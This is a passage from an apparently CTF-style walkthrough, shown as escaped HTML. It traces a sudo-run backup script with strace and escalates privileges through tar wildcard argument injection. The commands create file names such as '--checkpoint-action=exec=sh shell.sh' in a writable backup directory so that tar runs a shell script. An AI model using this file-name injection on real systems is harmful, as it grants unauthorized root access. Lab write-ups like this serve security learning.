&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/date&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1782&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-zvcf&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;app&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;database.sqlite&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;framework&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;logs&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;shell.sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1783&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/local/bin/gzip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gzip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ENOENT&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;No&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;such&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;or&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;1783&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;execve&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/bin/gzip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;gzip&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_FORMAT=gnu&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_SUBCOMMAND=-c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHELL=/bin/bash&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TERM=unknown&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;OLDPWD=/usr/local/bin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_BLOCKING_FACTOR=20&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USER=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LS_COLORS=&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_USER=robin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_UID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;USERNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MAIL=/var/mail/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;PWD=/usr/share/nginx/serverchecker/storage&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LANG=en_US.UTF-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_CHECKPOINT=1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;HOME=/home/bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_COMMAND=/usr/local/bin/dice&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SHLVL=14&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LOGNAME=bryan&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;TAR_VERSION=1.26&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;LESSOPEN=||/usr/bin/lesspipe.sh &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;SUDO_GID=1000&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;_=/bin/tar&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
&lt;li&gt;The &lt;code&gt;-s 999&lt;/code&gt; allows to specify the maximum string size to print&lt;/li&gt;
&lt;li&gt;the -v prints more informations&lt;/li&gt;
&lt;li&gt;the -f see the child process calls, you would not see a lot of things without
  this flag&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can see that the &lt;code&gt;tar&lt;/code&gt; utility is used. We have seen in the previous link
that we can exploit it using the &lt;code&gt;checkpoint&lt;/code&gt;. The backup directory is
&lt;code&gt;/usr/share/nginx/serverchecker/storage&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;touch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/share/nginx/serverchecker/storage/--checkpoint=1&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;touch&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/share/nginx/serverchecker/storage/--checkpoint-action=exec=sh shell.sh&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;serverchecker&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chmod&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;serverchecker&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;shell&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;bryan@fII bin&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ls&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;al&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;usr&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;share&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;serverchecker&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;storage&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;total&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxrwxrwx&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nginx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Mar&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;12&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;11&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;54&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
